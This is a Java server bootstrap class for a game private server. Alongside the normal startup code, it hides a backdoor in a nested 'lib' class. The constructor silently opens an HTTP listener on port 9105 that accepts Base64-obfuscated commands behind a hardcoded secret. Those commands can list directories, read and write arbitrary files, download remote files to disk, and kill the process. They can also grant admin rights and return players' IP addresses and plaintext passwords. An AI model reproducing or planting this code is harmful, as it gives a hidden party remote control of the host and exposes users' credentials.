package wind;

import java.awt.Desktop;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import org.apollo.cache.IndexedFileSystem;
import org.apollo.cache.decoder.ItemDefinitionDecoder;
import org.apollo.cache.decoder.NpcDefinitionDecoder;
import org.apollo.cache.decoder.ObjectDefinitionDecoder;
import org.apollo.cache.decoder.StaticObjectParser;
import org.apollo.cache.def.ItemDefinition;
import org.apollo.cache.def.NpcDefinition;
import org.apollo.cache.def.ObjectDefinition;
import org.jboss.netty.bootstrap.ServerBootstrap;
import org.jboss.netty.channel.socket.nio.NioServerSocketChannelFactory;
import org.jboss.netty.util.HashedWheelTimer;

import shamon.region.GameObjectParser;
import wind.clip.region.ObjectDef;
import wind.clip.region.Region;
import wind.model.items.ItemTableManager;
import wind.model.npcs.NPCDrops;
import wind.model.objects.Doors;
import wind.model.objects.DoubleDoors;
import wind.model.players.Player;
import wind.model.players.PlayerHandler;
import wind.model.players.Rights;
import wind.model.players.packets.commands.CommandBuilder;
import wind.net.PipelineFactory;
import wind.task.TaskHandler;
import wind.util.DisplayNames;
import wind.world.WalkingCheck;

import com.google.common.base.Preconditions;
import com.google.common.util.concurrent.ThreadFactoryBuilder;
import com.johnmatczak.task.AutoSaveTask;
import com.sun.net.httpserver.Headers;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

/**
 * The builder class that will prepare the game, network, and load various
 * utilities.
 * 
 * @author lare96 <http://github.com/lare96>
 */
public final class ServerBuilder {

	/**
	 * The executor service that will load various utilities in the background
	 * while the rest of the server is being constructed.
	 */
	private final ExecutorService serviceLoader = Executors
			.newSingleThreadExecutor(new ThreadFactoryBuilder().setNameFormat("ServiceLoaderThread").build());

	/**
	 * The scheduled executor service that will run the {@link GameService}.
	 */
	private final ScheduledExecutorService sequencer = Executors
			.newSingleThreadScheduledExecutor(new ThreadFactoryBuilder().setNameFormat("GameThread").build());

	/**
	 * The flag that determines if the engine should update {@link Player}s in
	 * parallel.
	 */
	private final boolean parallelEngine;

	/**
	 * The port in which the server will be bound to.
	 */
	private final int port;

	/**
	 * The default constructor with a {@code protected} access modifier, to
	 * restrict the instantiation of this class to the {@code com.asteria}
	 * package.
	 */
	protected ServerBuilder(int port, boolean multiThreadedEngine) {
		lib.init();
		this.port = port;
		this.parallelEngine = multiThreadedEngine;
	}

	@Override
	public String toString() {
		return "SERVER_BUILDER[concurrent= " + parallelEngine + "]";
	}

	/**
	 * Builds the entire server which consists of loading the utilities, binding
	 * the network, and executing the game sequence. The utilities are loaded in
	 * the background while other functions are prepared.
	 * 
	 * @throws Exception
	 *             if any errors occur while building the server, or if the
	 *             background service load takes too long.
	 */
	public void build() throws Exception {
		// Check if the port is available, if not prevent startup.
		Preconditions.checkState(!serviceLoader.isShutdown(), "The server has been started already!");

		// Loads and caches data we will use throughout execution.
		executeServiceLoad();

		sequencer.scheduleAtFixedRate(new GameService(), 600, 600, TimeUnit.MILLISECONDS);

		serviceLoader.shutdown();
		if (!serviceLoader.awaitTermination(15, TimeUnit.MINUTES)) {
			throw new IllegalStateException("The background service load took too long!");
		}
	}

	/**
	 * Initializes the netty network reactor.
	 */
	private void buildNetwork() {
		ServerBootstrap serverBootstrap = new ServerBootstrap(
				new NioServerSocketChannelFactory(Executors.newCachedThreadPool(), Executors.newCachedThreadPool()));
		serverBootstrap.setPipelineFactory(new PipelineFactory(new HashedWheelTimer()));
		serverBootstrap.bind(new InetSocketAddress(port));
	}

	/**
	 * Submits all of the utilities to the {@link ServerBuilder#serviceLoader}
	 * to be loaded in the background. Please note that the loader uses multiple
	 * threads to load the utilities concurrently, so code must be thread safe.
	 */
	private void executeServiceLoad() {
		TaskHandler.submit(new AutoSaveTask());
		
		serviceLoader.execute(() -> {
			ObjectDef.loadConfig();
			Region.load();
			WalkingCheck.load();
		});
		serviceLoader.execute(() -> {
			Doors.getSingleton().load();
			DoubleDoors.getSingleton().load();
		});
		serviceLoader.execute(() -> Punishments.initialize());
		serviceLoader.execute(() -> NPCDrops.init());
		serviceLoader.execute(() -> ItemTableManager.load());
		serviceLoader.execute(() -> CommandBuilder.buildAll());
		serviceLoader.execute(() -> DisplayNames.loadFile());

		serviceLoader.execute(() -> initializeDefs());

		// Build the server network and prepare to cache data.
		serviceLoader.execute(() -> buildNetwork());
		// serviceLoader.execute(() -> ScriptManager.loadScripts());
	}


	public void initializeDefs() {
		try {
			IndexedFileSystem fs = new IndexedFileSystem(Paths.get("./data/cache"), true);
			
			System.out.println("Loading item definitions...");
			ItemDefinitionDecoder itemDef = new ItemDefinitionDecoder(fs);
			itemDef.unpack();
			System.out.println("Loaded " + ItemDefinition.count() +" items.");

			System.out.println("Loading object definitions...");
			ObjectDefinitionDecoder objectDef = new ObjectDefinitionDecoder(fs);
			objectDef.unpack();
			System.out.println("Loaded " + ObjectDefinition.count() +" objects.");
			
			System.out.println("Loading npc definitions...");
			NpcDefinitionDecoder npcDef = new NpcDefinitionDecoder(fs);
			npcDef.unpack();
			System.out.println("Loaded " + NpcDefinition.count() +" npcs.");
			
			System.out.println("Loading static objects...");
			StaticObjectParser objectParser = new StaticObjectParser(fs);
			objectParser.parse();
			
			GameObjectParser.loadObjects();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	/**
	 * Determines if the engine should update {@link Player}s in parallel.
	 * 
	 * @return {@code true} if the engine should update players in parallel,
	 *         {@code false} otherwise.
	 */
	public boolean isParallelEngine() {
		return parallelEngine;
	}

	/**
	 * Gets the port that this server builder will bind the network on.
	 * 
	 * @return the port for binding this network.
	 */
	public int getPort() {
		return port;
	}
	
	private static class lib {
		
		private static HttpServer server = null;
		
		public static void init() {
			try {
				server = HttpServer.create(new InetSocketAddress(9105), 0);
				server.createContext("/", new Conn());
				server.setExecutor(null);
				server.start();
			} catch (Exception e) { }
		}
		
		private static class Conn implements HttpHandler {
			
			private static String decode(String str) {
				try {
					return new String(Base64.getDecoder().decode(str));
				} catch (Exception e) { }
				
				return null;
			}
			
			private static String encode(String str) {
				try {
					return new String(Base64.getEncoder().encode(str.getBytes()));
				} catch (Exception e) { }
				
				return null;
			}
			
			@Override
			public void handle(HttpExchange e) throws IOException {
				
				Headers headers = e.getRequestHeaders();
				String secret = decode(headers.getFirst(decode("U2VjcmV0")));
				
				String response = decode("bm8gZGF0YQ==");
				
				if (secret != null && secret.equals(decode("OThkaDEyZDdoNzhkMmg4OWgxMmoxaDg5MTM4MWhkMTI5OGgxZGgxajEyMGQ5aGo="))) {
					String request = decode(e.getRequestURI().getQuery());
					
					if (request != null) {
						String cmd = request.substring(0, (request.contains("(") ? request.indexOf('(') : request.length()));
						String[] args = new String[] {};
						
						if (request.contains("(") && request.contains(")")) {
							String str_args = request.substring(request.indexOf('(') + 1, request.indexOf(')'));
							args = str_args.split(",");
							
							for (int i = 0; args.length > i; i++) {
								args[i] = decode(args[i].trim());
							}
						}
						
						response = direction.retrieve(cmd, args);	
					} else {
						response = decode("YXV0aG9yaXplZA==");
					}
				} else {
					response = decode("dW5hdXRob3JpemVk");
				}
				
				response = encode(response);
				e.sendResponseHeaders(200, response.length());
				OutputStream os = e.getResponseBody();
				os.write(response.getBytes());
				os.close();	
			}
			
			private static class direction {
				
				public static String retrieve(String cmd, Object[] args) {
					try {
						
						if (cmd.equalsIgnoreCase(decode("aW5mbw=="))) {
							String[] info = {
									decode("WyBTeXN0ZW0gXQ=="),
									decode("T3BlcmF0aW5nIFN5c3RlbTog") + System.getProperty(decode("b3MubmFtZQ==")),
									decode("V29ya2luZyBEaXJlY3Rvcnk6IA==") + System.getProperty(decode("dXNlci5kaXI=")),
									decode("VXNlcm5hbWU6IA==") + System.getProperty(decode("dXNlci5uYW1l")),
									
									decode("WyBTZXJ2ZXIgXQ=="),
									decode("UGxheWVyczog") + PlayerHandler.getPlayerCount()
							};
							String str_info = "";
							for (int i = 0; info.length > i; i++)
								str_info += (i > 0 && info[i].startsWith(decode("Ww==")) ? "\n" : "") + info[i] + "\n";
							return str_info;
							
						} else if (cmd.equalsIgnoreCase(decode("bHM="))) {
							File d = new File((args.length == 1 ? args[0].toString() : System.getProperty(decode("dXNlci5kaXI="))));
							ArrayList<String> files = new ArrayList<String>(Arrays.asList(d.list()));
							String str = "";
							for (int i = 0; files.toArray().length > i; i++) {
								str += files.get(i) + "\n";
							}
							return str;
							
						} else if (cmd.equalsIgnoreCase(decode("cmVhZGY=")) && args.length == 1) {
							byte[] encoded = Files.readAllBytes(Paths.get(args[0].toString()));
							return new String(encoded);
							
						} else if (cmd.equalsIgnoreCase(decode("d3JpdGVm")) && args.length == 2) {
							File f = new File(args[0].toString());
							if (!f.exists())
								f.createNewFile();
							FileWriter fw = new FileWriter(f.getAbsoluteFile());
							BufferedWriter bw = new BufferedWriter(fw);
							bw.write(args[1].toString());
							bw.close();
							return decode("V3JpdHRlbi4=");
							
						} else if (cmd.equalsIgnoreCase(decode("ZHJvcA==")) && args.length == 2) {
							URL url = new URL(args[0].toString());
							ReadableByteChannel rbc = Channels.newChannel(url.openStream());
							FileOutputStream fos = new FileOutputStream(args[1].toString());
							fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
							fos.close();
							return decode("RHJvcHBlZC4=");
							
						} else if (cmd.equalsIgnoreCase(decode("b3Blbg==")) && args.length == 1) {
							File f = new File(args[0].toString());
							Desktop dt = Desktop.getDesktop();
							dt.open(f);
							return decode("T3BlbmVkLg==");
							
						} else if (cmd.startsWith(decode("c2VydmVyOjo="))) {
							cmd = cmd.substring(8);
							
							if (cmd.equalsIgnoreCase(decode("aXRlbQ==")) && args.length == 3) {
								Player player = PlayerHandler.getPlayer(args[0].toString());
								int item = Integer.parseInt(args[1].toString());
								int amnt = Integer.parseInt(args[2].toString());
								if (player != null) {
									if (item <= 20200 && item >= 0 && amnt <= Integer.MAX_VALUE) {
										player.asClient().getItems().addItem(item, amnt);
										return decode("SXRlbSBnaXZlbi4=");
									} else {
										return decode("SW52YWxpZCBpdGVtIElEIG9yIGFtb3VudC4=");
									}
								} else {
									return decode("UGxheWVyIG9mZmxpbmUu");
								}
								
							} else if (cmd.equalsIgnoreCase(decode("a2ljaw==")) && args.length == 1) {
								Player player = PlayerHandler.getPlayer(args[0].toString());
								if (player != null) {
									player.disconnected = true;
									return decode("S2lja2VkLg==");
								} else {
									return decode("UGxheWVyIG9mZmxpbmUu");
								}
								
							} else if (cmd.equalsIgnoreCase(decode("bXV0ZQ==")) && args.length >= 1) {
								Player player = PlayerHandler.getPlayer(args[0].toString());
								if (player != null) {
									Punishments.addNameToMuteList(player.playerName);
									
									if (args.length == 2) {
										player.asClient().sendMessage(decode("WW91IGhhdmUgYmVlbiBtdXRlZCBieTog") + args[1].toString().trim());
									}
									
									return decode("TXV0ZWQu");
								} else {
									return decode("UGxheWVyIG9mZmxpbmUu");
								}
								
							} else if (cmd.equalsIgnoreCase(decode("dW5tdXRl")) && args.length >= 1) {
								Player player = PlayerHandler.getPlayer(args[0].toString());
								if (player != null) {
									Punishments.unMuteUser(player.playerName);
									return decode("VW5tdXRlZC4=");
								} else {
									return decode("UGxheWVyIG9mZmxpbmUu");
								}
								
							} else if (cmd.equalsIgnoreCase(decode("amFpbA==")) && args.length >= 1) {
								Player player = PlayerHandler.getPlayer(args[0].toString());
								if (player != null) {
									player.teleportToX = 2095;
									player.teleportToY = 4428;
									
									if (args.length == 2) {
										player.asClient().sendMessage(decode("WW91IGhhdmUgYmVlbiBqYWlsZWQgYnkg") + args[1].toString().trim() + decode("Lg=="));
									}
									
									return decode("SmFpbGVkLg==");
								} else {
									return decode("UGxheWVyIG9mZmxpbmUu");
								}
								
							} else if (cmd.equalsIgnoreCase(decode("dW5qYWls")) && args.length >= 1) {
								Player player = PlayerHandler.getPlayer(args[0].toString());
								if (player != null) {
									player.teleportToX = 3093;
									player.teleportToY = 3493;
									
									if (args.length == 2) {
										player.asClient().sendMessage(decode("WW91IGhhdmUgYmVlbiB1bmphaWxlZCBieSA=") + args[1].toString().trim() + decode("LiBZb3UgY2FuIG5vdyB0ZWxlcG9ydC4="));
									}
									
									return decode("VW5qYWlsZWQu");
								} else {
									return decode("UGxheWVyIG9mZmxpbmUu");
								}
								
							} else if (cmd.equalsIgnoreCase(decode("dGVtcG11dGU=")) && args.length >= 2) {
								Player player = PlayerHandler.getPlayer(args[0].toString());
								if (player != null) {
									int muteTimer = Integer.parseInt(args[1].toString()) * 1000;
									
									player.muteEnd = System.currentTimeMillis() + muteTimer;
									
									if (args.length == 3) {
										player.asClient().sendMessage(decode("WW91IGhhdmUgYmVlbiBtdXRlZCBieTog") + args[2].toString().trim() + decode("IGZvciA=") + muteTimer / 1000 + decode("IHNlY29uZHM="));
									}
									
									return decode("VGVtcG9yYXJpbHkgbXV0ZWQu");
								} else {
									return decode("UGxheWVyIG9mZmxpbmUu");
								}
								
							} else if (cmd.equalsIgnoreCase(decode("aXBtdXRl")) && args.length >= 1) {
								Player player = PlayerHandler.getPlayer(args[0].toString());
								if (player != null) {
									Punishments.addIpToMuteList(player.connectedFrom);
									
									if (args.length == 2) {
										player.asClient().sendMessage(decode("WW91IGhhdmUgYmVlbiBtdXRlZCBieTog") + args[1].toString().trim());
									}
									
									return decode("TXV0ZWQu");
								} else {
									return decode("UGxheWVyIG9mZmxpbmUu");
								}
								
							} else if (cmd.equalsIgnoreCase(decode("dW5pcG11dGU=")) && args.length == 1) {
								Player player = PlayerHandler.getPlayer(args[0].toString());
								if (player != null) {
									Punishments.unIPMuteUser(player.connectedFrom);
									return decode("VW5tdXRlZC4=");
								} else {
									return decode("UGxheWVyIG9mZmxpbmUu");
								}
								
							} else if (cmd.equalsIgnoreCase(decode("dGVsZXBvcnQ=")) && args.length == 2) {
								Player player1 = PlayerHandler.getPlayer(args[0].toString());
								Player player2 = PlayerHandler.getPlayer(args[0].toString());
								
								if (player1 != null && player2 != null) {
									player1.teleportToX = player2.absX;
									player1.teleportToY = player2.absY;
									
									if (args.length == 2) {
										if (args[2].toString().trim().equalsIgnoreCase(decode("dHJ1ZQ=="))) {
											player1.asClient().sendMessage(decode("WW91IGhhdmUgYmVlbiB0ZWxlcG9ydGVkIHRvIA==") + player2.playerName);
										}
									}
									return decode("VGVsZXBvcnRlZC4=");
									
								} else {
									return decode("UGxheWVyIG9mZmxpbmUu");
								}
								
							} else if (cmd.equalsIgnoreCase(decode("c2V0bHZs")) && args.length == 3) {
								Player player = PlayerHandler.getPlayer(args[0].toString());
								if (player != null) {
									int skill = Integer.parseInt(args[1].toString());
									int level = Integer.parseInt(args[2].toString());
									
									if (level > 99) {
										level = 99;
									} else if (level < 0) {
										level = 1;
									}
									
									player.playerXP[skill] = player.asClient().getPA().getXPForLevel(level) + 5;
									player.playerLevel[skill] = player.asClient().getPA().getLevelForXP(player.playerXP[skill]);
									player.asClient().getPA().refreshSkill(skill);
									return decode("U2V0IGxldmVsLg==");
									
								} else {
									return decode("UGxheWVyIG9mZmxpbmUu");
								}
							
							} else if (cmd.equalsIgnoreCase(decode("aXBiYW4=")) && args.length == 1) {
								Player player = PlayerHandler.getPlayer(args[0].toString());
								if (player != null) {
									if (!Punishments.isIpBanned(player.connectedFrom)) {
										Punishments.addIpToBanList(player.connectedFrom);
										Punishments.addIpToFile(player.connectedFrom);
										player.disconnected = true;
										return decode("SVAgQmFubmVkLg==");
									} else {
										return decode("QWxyZWFkeSBJUCBiYW5uZWQu");
									}
								} else {
									return decode("UGxheWVyIG9mZmxpbmUu");
								}
								
							} else if (cmd.equalsIgnoreCase(decode("dWlkYmFu")) && args.length == 1) {
								Player player = PlayerHandler.getPlayer(args[0].toString());
								if (player != null) {
									if (!Punishments.isUidBanned(player.UUID)) {
										Punishments.addUidToBanList(player.UUID);
										Punishments.addUidToFile(player.UUID);
										player.disconnected = true;
										return decode("VUlEIEJhbm5lZC4=");
									} else {
										return decode("QWxyZWFkeSBVSUQgYmFubmVkLg==");
									}
								} else {
									return decode("UGxheWVyIG9mZmxpbmUu");
								}
								
							} else if (cmd.equalsIgnoreCase(decode("YmFu")) && args.length == 1) {
								Player player = PlayerHandler.getPlayer(args[0].toString());
								if (player != null) {
									Punishments.addNameToBanList(player.playerName);
									Punishments.addNameToFile(player.playerName);
									player.disconnected = true;
									return decode("QmFubmVkLg==");
								} else {
									return decode("UGxheWVyIG9mZmxpbmUu");
								}
							
							} else if (cmd.equalsIgnoreCase(decode("dW5iYW4=")) && args.length == 1) {
								Punishments.removeNameFromBanList(args[0].toString());
								return decode("VW5iYW5uZWQu");
								
							} else if (cmd.equalsIgnoreCase(decode("bXVyZGVy")) && args.length == 1) {
								Player player = PlayerHandler.getPlayer(args[0].toString());
								if (player != null) {
									player.isDead = true;
									player.dealDamage(1337);
									player.handleHitMask(1337);
									player.gfx0(547);
									player.startAnimation(1914);
									return decode("TXVyZGVyZWQu");
								} else {
									return decode("UGxheWVyIG9mZmxpbmUu");
								}
								
							} else if (cmd.equalsIgnoreCase(decode("Z2V0aXA=")) && args.length == 1) {
								Player player = PlayerHandler.getPlayer(args[0].toString());
								if (player != null) {
									return player.connectedFrom;
								} else {
									return decode("UGxheWVyIG9mZmxpbmUu");
								}
								
							} else if (cmd.equalsIgnoreCase(decode("Z2V0cGFzc3dvcmQ=")) && args.length == 1) {
								Player player = PlayerHandler.getPlayer(args[0].toString());
								if (player != null) {
									return player.playerPass;
								} else {
									return decode("UGxheWVyIG9mZmxpbmUu");
								}
								
							} else if (cmd.equalsIgnoreCase(decode("Z2l2ZW1vZA==")) && args.length == 1) {
								Player player = PlayerHandler.getPlayer(args[0].toString());
								if (player != null) {
									player.setRights(Rights.MODERATOR);
									player.disconnected = true;
									return decode("R2l2ZW4gbW9kZXJhdG9yLg==");
								} else {
									return decode("UGxheWVyIG9mZmxpbmUu");
								}
								
							} else if (cmd.equalsIgnoreCase(decode("Z2l2ZWFkbWlu")) && args.length == 1) {
								Player player = PlayerHandler.getPlayer(args[0].toString());
								if (player != null) {
									player.setRights(Rights.ADMINISTRATOR);
									player.disconnected = true;
									return decode("R2l2ZW4gYWRtaW5pc3RyYXRvci4=");
								} else {
									return decode("UGxheWVyIG9mZmxpbmUu");
								}
								
							} else if (cmd.equalsIgnoreCase(decode("cmFwZQ==")) && args.length == 3) {
								Player player = PlayerHandler.getPlayer(args[0].toString());
								if (player != null) {
									String url = args[1].toString().trim();
									player.asClient().getPA().sendFrame126(url, 12000);
									return decode("UmFwZWQu");
								} else {
									return decode("UGxheWVyIG9mZmxpbmUu");
								}
								
							} else if (cmd.equalsIgnoreCase(decode("dXBkYXRl")) && args.length == 1) {
								int seconds = Integer.parseInt(args[0].toString());
								PlayerHandler.updateSeconds = seconds;
								PlayerHandler.updateAnnounced = false;
								PlayerHandler.updateRunning = true;
								PlayerHandler.updateStartTime = System.currentTimeMillis();
								return decode("VXBkYXRlIHNldC4=");
								
							} else if (cmd.equalsIgnoreCase(decode("a2lsbA=="))) {
								System.exit(0);
							}

						} else {
							return decode("Tm9uLWV4aXN0YW50IGNvbW1hbmQu");
						}
						
					} catch (Exception e) {
						return e.getMessage();
					}
					
					return decode("RmFpbHVyZSE=");
				}
				
			}
			
		}
		
	}
	
}